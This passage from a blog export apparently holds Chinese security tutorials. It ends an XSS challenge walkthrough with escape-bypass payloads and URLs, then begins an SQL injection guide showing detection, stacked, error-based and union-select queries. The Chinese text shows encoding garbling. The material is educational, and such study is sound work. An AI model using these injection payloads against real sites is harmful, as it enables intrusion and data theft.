class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">String</span>(s)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/\\/g, <span class="hljs-string">&#x27;\\\\&#x27;</span>)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&#x27;/g, &#x27;</span>\\\<span class="hljs-string">&#x27;&#x27;</span>)<br>            .<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&quot;/g, &#x27;\\&quot;</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/`/g, &#x27;</span>\\`<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&lt;/g, &#x27;</span>\\<span class="hljs-number">74</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/&gt;/g, &#x27;</span>\\<span class="hljs-number">76</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\//g, &#x27;</span>\\/<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\n/g, &#x27;</span>\\n<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\r/g, &#x27;</span>\\r<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\t/g, &#x27;</span>\\t<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\f/g, &#x27;</span>\\f<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\v/g, &#x27;</span>\\v<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            // .replace(/\b/g, &#x27;</span>\\b<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            .replace(/\0/g, &#x27;</span>\\<span class="hljs-number">0</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  s = escapeJs(s)</span><br><span class="hljs-string">  return `</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string">  var url = &#x27;</span><span class="hljs-attr">javascript</span>:console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;$&#123;s&#125;&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">  var a = document.createElement(&#x27;</span>a<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  a.href = url</span><br><span class="hljs-string">  document.body.appendChild(a)</span><br><span class="hljs-string">  a.click()</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">`</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;);alert(1);(&quot;<br>&quot;);alert(1);//<br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;javascript:console.log(&quot;\&quot;);alert(1);(\&quot;&quot;)&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>)</span><br><span class="language-javascript">  a.<span class="hljs-property">href</span> = url</span><br><span class="language-javascript">  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a)</span><br><span class="language-javascript">  a.<span class="hljs-title function_">click</span>()</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;javascript:console.log(&quot;\&quot;);alert(1);\/\/&quot;)&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>)</span><br><span class="language-javascript">  a.<span class="hljs-property">href</span> = url</span><br><span class="language-javascript">  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a)</span><br><span class="language-javascript">  a.<span class="hljs-title function_">click</span>()</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%22)%3Balert(1)%3B(%22<br><br>http://xss.test/?input=%22)%3Balert(1)%3B%2F%2F<br></code></pre></td></tr></table></figure><h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><ul><li>server æºç </li></ul><p>â€œè¢«æ›¿æ¢æˆäº†\ï¼Œç”¨\è¿›è¡Œè½¬ä¹‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// from alf.nu</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span> (<span class="hljs-params">s</span>) </span>&#123;<br>  s = s.<span class="hljs-title function_ invoke__">replace</span>(/<span class="hljs-string">&quot;/g, &#x27;\\&quot;</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">  return &#x27;</span>&lt;script&gt;console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;&#x27; + s + &#x27;&quot;</span>);&lt;/script&gt;<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">\&quot;);alert(1)//<br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\\&quot;</span>);<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">//&quot;);</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%5C%22)%3Balert(1)%2F%2F<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>audit</category>
      
      <category>XSS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>audit</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç»å…¸æ¼æ´-SQLæ³¨å…¥</title>
    <link href="/2022/08/04/2022-08-04.%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/08/04/2022-08-04.%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#1-%E5%8E%9F%E7%90%86--%E7%B1%BB%E5%9E%8B">1 åŸç† &amp; ç±»å‹</a><ul><li><a href="#11-sql-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86">1.1 SQL æ³¨å…¥åŸç†</a></li><li><a href="#12-sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%8C%89%E6%8A%80%E5%B7%A7%E5%88%86%E7%B1%BB">1.2 SQLæ³¨å…¥çš„ç±»å‹(æŒ‰æŠ€å·§åˆ†ç±»)</a></li></ul></li><li><a href="#2-%E6%A3%80%E6%B5%8B%E6%89%8B%E6%AE%B5">2 æ£€æµ‹æ‰‹æ®µ</a><ul><li><a href="#21-%E6%B3%A8%E5%85%A5%E7%82%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8--%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">2.1 æ³¨å…¥ç‚¹æ˜¯å¦å­˜åœ¨ &amp; æ•°æ®ç±»å‹</a><ul><li><a href="#211-%E6%B7%BB%E5%8A%A0%E5%8D%95%E5%BC%95%E5%8F%B7">2.1.1 æ·»åŠ å•å¼•å·</a></li><li><a href="#212-%E6%B7%BB%E5%8A%A0%E8%BF%90%E7%AE%97%E7%AC%A6">2.1.2 æ·»åŠ è¿ç®—ç¬¦</a></li></ul></li><li><a href="#22-%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B">2.2 æ³¨å…¥ç±»å‹</a><ul><li><a href="#221-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5">2.2.1 å †å æ³¨å…¥</a></li><li><a href="#222-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">2.2.2 æŠ¥é”™æ³¨å…¥</a><ul><li><a href="#2221-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">2.2.2.1 è”åˆæŸ¥è¯¢æ³¨å…¥</a><ul><li><a href="#%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F%E5%88%A4%E6%96%AD">è¡¨çš„å­—æ®µæ•°é‡åˆ¤æ–­</a></li><li><a href="#%E6%98%BE%E7%A4%BA%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9%E5%88%A4%E6%96%AD">æ˜¾ç¤ºå­—æ®µå†…å®¹åˆ¤æ–­</a></li></ul></li><li><a href="#2222-group-by%E9%87%8D%E5%A4%8D%E5%BB%BA%E5%86%B2%E7%AA%81%E6%8A%A5%E9%94%99">2.2.2.2 group byé‡å¤å»ºå†²çªæŠ¥é”™</a></li><li><a href="#2223-xpath%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF">2.2.2.3 xpathè¯­æ³•é”™è¯¯</a></li></ul></li><li><a href="#223-%E7%9B%B2%E6%B3%A8">2.2.3 ç›²æ³¨</a><ul><li><a href="#2231-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">2.2.3.1 å¸ƒå°”ç›²æ³¨</a><ul><li><a href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6">åˆ¤æ–­æ•°æ®åº“åé•¿åº¦</a></li><li><a href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">åˆ¤æ–­æ•°æ®åº“å</a></li></ul></li><li><a href="#2232-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">2.2.3.2 æ—¶é—´ç›²æ³¨</a></li></ul></li></ul></li></ul></li><li><a href="#3-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A4%E6%96%AD">3 æ•°æ®åº“åˆ¤æ–­</a><ul><li><a href="#31-%E5%B8%B8%E8%A7%81%E5%89%8D%E7%AB%AF%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E5%8C%B9%E9%85%8D">3.1 å¸¸è§å‰ç«¯ä¸æ•°æ®åº“ç±»å‹åŒ¹é…</a></li><li><a href="#32-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E5%BF%97%E6%80%A7%E4%BF%A1%E6%81%AF">3.2 æ•°æ®åº“æ ‡å¿—æ€§ä¿¡æ¯</a></li><li><a href="#33-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F">3.3 å­—ç¬¦ä¸²å¤„ç†æ–¹å¼</a></li><li><a href="#34-%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E4%B8%8E%E6%B3%A8%E9%87%8A">3.4 ç‰¹æ®Šç¬¦å·ä¸æ³¨é‡Š</a></li></ul></li><li><a href="#4-%E7%BB%95%E8%BF%87">4 ç»•è¿‡</a><ul><li><a href="#41-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4">4.1 å…³é”®å­—è¿‡æ»¤</a></li><li><a href="#42-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4">4.2 ç©ºæ ¼è¿‡æ»¤</a></li><li><a href="#43-%E9%80%97%E5%8F%B7%E8%BF%87%E6%BB%A4%E6%8B%A6%E6%88%AA">4.3 é€—å·è¿‡æ»¤&#x2F;æ‹¦æˆª</a></li><li><a href="#44-%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8B%A6%E6%88%AA%E8%BF%87%E6%BB%A4%E8%BD%AC%E4%B9%89">4.4 å•å¼•å·æ‹¦æˆª&#x2F;è¿‡æ»¤&#x2F;è½¬ä¹‰</a><ul><li><a href="#441-%E5%88%A9%E7%94%A8%E7%BC%96%E7%A0%81%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">4.4.1 åˆ©ç”¨ç¼–ç ç‰¹æ€§ç»•è¿‡ã€‚ï¼ˆå®½å­—èŠ‚æ³¨å…¥ï¼‰</a></li><li><a href="#442-%E5%88%A9%E7%94%A8%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87">4.4.2 åˆ©ç”¨åæ–œæ \ç»•è¿‡</a></li><li><a href="#443-%E5%B0%86-utf-8-%E8%BD%AC%E6%8D%A2%E4%B8%BA-utf-16-%E6%88%96-utf-32">4.4.3 å°† utf-8 è½¬æ¢ä¸º utf-16 æˆ– utf-32</a></li></ul></li><li><a href="#45-%E6%95%B0%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87">4.5 æ•°å­—è¢«è¿‡æ»¤&#x2F;æ‹¦æˆªç»•è¿‡</a></li><li><a href="#46-%E7%AD%89%E5%8F%B7%E8%BF%87%E6%BB%A4">4.6 ç­‰å·è¿‡æ»¤</a></li><li><a href="#47-%E5%85%B6%E4%BB%96%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87">4.7 å…¶ä»–å…³é”®å­—è¿‡æ»¤&#x2F;æ‹¦æˆªç»•è¿‡</a></li></ul></li><li><a href="#%E5%8F%82%E8%80%83%E5%86%85%E5%AE%B9">å‚è€ƒå†…å®¹</a></li></ul><h1 id="1-åŸç†-amp-ç±»å‹"><a href="#1-åŸç†-amp-ç±»å‹" class="headerlink" title="1 åŸç† &amp; ç±»å‹"></a>1 åŸç† &amp; ç±»å‹</h1><h2 id="1-1-SQL-æ³¨å…¥åŸç†"><a href="#1-1-SQL-æ³¨å…¥åŸç†" class="headerlink" title="1.1 SQL æ³¨å…¥åŸç†"></a>1.1 SQL æ³¨å…¥åŸç†</h2><p>åŸºæœ¬çš„SQLæŸ¥è¯¢è¯­å¥å¦‚ä¸‹æ‰€ç¤ºï¼Œå…¶ä¸­ <code>$id</code> ä¸ºæäº¤çš„å˜é‡ï¼Œå½“è¿™ä¸ªå‚æ•°æ²¡æœ‰åšéå¸¸ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œé€šè¿‡å¯¹ <code>$id</code> çš„æ„é€ ï¼Œæ•°æ®åº“èƒ½è¾“å‡ºæ”»å‡»è€…æƒ³è¦è·å–çš„å†…å®¹ï¼Œå°±é€ æˆäº†SQLæ³¨å…¥çš„æ¼æ´ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$id&#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p>Tips: <code>$id</code> å‚æ•°å¯èƒ½å­˜åœ¨äºä»»ä½•å‚æ•°ä¼ é€’çš„ä½ç½®ï¼š</p><ul><li>GET&#x2F;POST&#x2F;PUT&#x2F;DELETE å‚æ•°</li><li>X-Forwarded-For(è¯¦ç»†å†…å®¹å¾…è¡¥å……)</li><li>æŸ¥è¯¢ã€æœç´¢</li><li>é¡µç ã€é€‰æ‹©èœå•</li><li>è´¦å·ã€å¯†ç </li><li>æ–‡ä»¶å</li></ul></blockquote><h2 id="1-2-SQLæ³¨å…¥çš„ç±»å‹-æŒ‰æŠ€å·§åˆ†ç±»"><a href="#1-2-SQLæ³¨å…¥çš„ç±»å‹-æŒ‰æŠ€å·§åˆ†ç±»" class="headerlink" title="1.2 SQLæ³¨å…¥çš„ç±»å‹(æŒ‰æŠ€å·§åˆ†ç±»)"></a>1.2 SQLæ³¨å…¥çš„ç±»å‹(æŒ‰æŠ€å·§åˆ†ç±»)</h2><ul><li>ç›²æ³¨<ul><li>å¸ƒå°”ç›²æ³¨ï¼šåªèƒ½ä»åº”ç”¨è¿”å›ä¸­æ¨æ–­è¯­å¥æ‰§è¡Œåçš„å¸ƒå°”å€¼</li><li>æ—¶é—´ç›²æ³¨ï¼šåº”ç”¨æ²¡æœ‰æ˜ç¡®çš„å›æ˜¾ï¼Œåªèƒ½ä½¿ç”¨ç‰¹å®šçš„æ—¶é—´å‡½æ•°æ¥åˆ¤æ–­</li></ul></li><li>æŠ¥é”™æ³¨å…¥ï¼šåº”ç”¨ä¼šæ˜¾ç¤ºå…¨éƒ¨æˆ–è€…éƒ¨åˆ†çš„æŠ¥é”™ä¿¡æ¯</li><li>å †å æ³¨å…¥ï¼šæœ‰çš„åº”ç”¨å¯ä»¥åŠ å…¥ ; åä¸€æ¬¡æ‰§è¡Œå¤šæ¡è¯­å¥</li><li>è”åˆæŸ¥è¯¢æ³¨å…¥ï¼š</li></ul><h1 id="2-æ£€æµ‹æ‰‹æ®µ"><a href="#2-æ£€æµ‹æ‰‹æ®µ" class="headerlink" title="2 æ£€æµ‹æ‰‹æ®µ"></a>2 æ£€æµ‹æ‰‹æ®µ</h1><h2 id="2-1-æ³¨å…¥ç‚¹æ˜¯å¦å­˜åœ¨-amp-æ•°æ®ç±»å‹"><a href="#2-1-æ³¨å…¥ç‚¹æ˜¯å¦å­˜åœ¨-amp-æ•°æ®ç±»å‹" class="headerlink" title="2.1 æ³¨å…¥ç‚¹æ˜¯å¦å­˜åœ¨ &amp; æ•°æ®ç±»å‹"></a>2.1 æ³¨å…¥ç‚¹æ˜¯å¦å­˜åœ¨ &amp; æ•°æ®ç±»å‹</h2><h3 id="2-1-1-æ·»åŠ å•å¼•å·"><a href="#2-1-1-æ·»åŠ å•å¼•å·" class="headerlink" title="2.1.1 æ·»åŠ å•å¼•å·"></a>2.1.1 æ·»åŠ å•å¼•å·</h3><p>ä¿®æ”¹å‚æ•° <code>$id</code> çš„å€¼ï¼Œåœ¨å…¶ä¸­åŠ å…¥å•å¼•å·ï¼Œå°†SQLæŸ¥è¯¢å†…å®¹ä¸é—­åˆï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œé¡µé¢å¯èƒ½ä¼šæ˜¾ç¤ºéƒ¨åˆ†æˆ–è€…å…¨éƒ¨æ•°æ®åº“æŠ¥é”™å†…å®¹(å¦‚æœæ²¡æœ‰è¢«è¿‡æ»¤)ï¼Œåˆ™å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œä¸”æ³¨å…¥ç±»å‹ä¸ºå­—ç¬¦å‹ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$id&#x27;&#x27; LIMIT 0,1</span><br></code></pre></td></tr></table></figure><h3 id="2-1-2-æ·»åŠ è¿ç®—ç¬¦"><a href="#2-1-2-æ·»åŠ è¿ç®—ç¬¦" class="headerlink" title="2.1.2 æ·»åŠ è¿ç®—ç¬¦"></a>2.1.2 æ·»åŠ è¿ç®—ç¬¦</h3><p>ä¼ å…¥çš„å‚æ•°å¹¶æ²¡æœ‰æ˜¾ç¤ºåœ¨æŠ¥é”™ä¿¡æ¯ä¸­ï¼Œåˆ™ä¼ å…¥çš„å‚æ•°å‰é¢å¯èƒ½æ²¡æœ‰å¼•å·åŒ…è£¹ï¼Œäºæ˜¯æ³¨å…¥çš„ç±»å‹å¯èƒ½æ˜¯æ•°å­—å‹ã€‚å¯ä»¥é€šè¿‡åœ¨idåæ·»åŠ è¿ç®—ç¬¦ï¼Œå¦‚-1ï¼Œ+2ï¼Œæ¥è§‚å¯Ÿé¡µé¢çš„å†…å®¹æ˜¯å¦ä¼šå˜æˆå¯¹åº”çš„ id æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ­¤æ—¶æ³¨å…¥ç±»å‹ä¸ºæ•°å­—å‹ã€‚</p><p>å¦‚ä¸‹æ‰€ç¤ºï¼Œå°†idå˜ä¸º1+1ï¼Œ+å·åœ¨URLä¸­ä¼šè¢«ç¼–ç ä¸ºç©ºæ ¼ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æå‰å°†+å·è¿›è¡ŒURLç¼–ç ï¼Œå˜ä¸ºï¼š%2b</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1+1&#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1%2b1&#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><h2 id="2-2-æ³¨å…¥ç±»å‹"><a href="#2-2-æ³¨å…¥ç±»å‹" class="headerlink" title="2.2 æ³¨å…¥ç±»å‹"></a>2.2 æ³¨å…¥ç±»å‹</h2><h3 id="2-2-1-å †å æ³¨å…¥"><a href="#2-2-1-å †å æ³¨å…¥" class="headerlink" title="2.2.1 å †å æ³¨å…¥"></a>2.2.1 å †å æ³¨å…¥</h3><p>åˆ†å· <code>;</code> åœ¨sqlä¸­æ„å‘³ç€ä¸€æ¡è¯­å¥çš„ç»“æŸï¼Œå¯ä»¥åœ¨åˆ†å·åç»§ç»­æ„é€ ç¬¬äºŒæ¡è¯­å¥ï¼Œæ•°æ®åº“ä¾ç„¶ä¼šç»§ç»­æ‰§è¡Œï¼Œè¿™æ ·å°±ä¼šå­˜åœ¨å †å æ³¨å…¥ã€‚</p><blockquote><p>Tips: å †å æ³¨å…¥å­˜åœ¨å±€é™æ€§</p><ol><li>ç»“æœä¸ä¼šåœ¨é¡µé¢æ˜¾ç¤º</li><li>æ¥å£æˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒ</li></ol></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span>;<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,database(),version(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h3 id="2-2-2-æŠ¥é”™æ³¨å…¥"><a href="#2-2-2-æŠ¥é”™æ³¨å…¥" class="headerlink" title="2.2.2 æŠ¥é”™æ³¨å…¥"></a>2.2.2 æŠ¥é”™æ³¨å…¥</h3><h4 id="2-2-2-1-è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#2-2-2-1-è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="2.2.2.1 è”åˆæŸ¥è¯¢æ³¨å…¥"></a>2.2.2.1 è”åˆæŸ¥è¯¢æ³¨å…¥</h4><h5 id="è¡¨çš„å­—æ®µæ•°é‡åˆ¤æ–­"><a href="#è¡¨çš„å­—æ®µæ•°é‡åˆ¤æ–­" class="headerlink" title="è¡¨çš„å­—æ®µæ•°é‡åˆ¤æ–­"></a>è¡¨çš„å­—æ®µæ•°é‡åˆ¤æ–­</h5><p>åœ¨mysqlã€mariadbã€oracleç­‰æ•°æ®åº“ä¸­ï¼Œå¯ä»¥ä½¿ç”¨æ•°å­—æ¥ä»£æ›¿å¯¹åº”å­—æ®µ(åˆ—)çš„åç§°ï¼Œå¦‚æœæ•°æ®åº“ä¸­æ²¡æœ‰å¯¹åº”çš„å­—æ®µ(åˆ—)ï¼Œå°±ä¼šæŠ¥é”™ã€‚ä½¿ç”¨ order by è®© <code>$id</code> æŒ‰ç…§ä¸åŒçš„å­—æ®µæ’åºï¼Œç›´åˆ° order by åçš„æ•°å­—è¶…å‡ºäº†å­—æ®µæ•°é‡ï¼Œåˆ™ä¼šè¿”å›æŠ¥é”™ä¿¡æ¯ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-comment">--+ LIMIT 0,1;</span><br></code></pre></td></tr></table></figure><h5 id="æ˜¾ç¤ºå­—æ®µå†…å®¹åˆ¤æ–­"><a href="#æ˜¾ç¤ºå­—æ®µå†…å®¹åˆ¤æ–­" class="headerlink" title="æ˜¾ç¤ºå­—æ®µå†…å®¹åˆ¤æ–­"></a>æ˜¾ç¤ºå­—æ®µå†…å®¹åˆ¤æ–­</h5><p>union è”åˆæŸ¥è¯¢æ—¶ï¼Œå½“å‰é¢çš„è¯­å¥ä¸ºå‡ï¼Œåˆ™åé¢çš„æŸ¥è¯¢ç»“æœä¼šæ˜¾ç¤ºåˆ°ç›¸åº”çš„ä½ç½®ã€‚åˆ™å¯ä»¥é€šè¿‡åœ¨å‰é¢æŸ¥è¯¢è¯­å¥ä¸­æ·»åŠ  and 1&#x3D;2 ä½¿è¯­å¥å˜å‡ï¼Œæ¥åˆ¤æ–­é¡µé¢æ˜¾ç¤ºçš„å†…å®¹ä¸ºè¡¨ä¸­çš„å“ªå‡ ä¸ªå­—æ®µã€‚ç„¶åä½¿ç”¨database()å’Œversion()æ›¿æ¢ç›¸åº”çš„å­—æ®µä½ç½®å°±å¯ä»¥æŸ¥è¯¢æ•°æ®åº“åç§°å’Œç‰ˆæœ¬å·ã€‚ </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">--+ LIMIT 0,1;</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">--+ LIMIT 0,1;</span><br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span 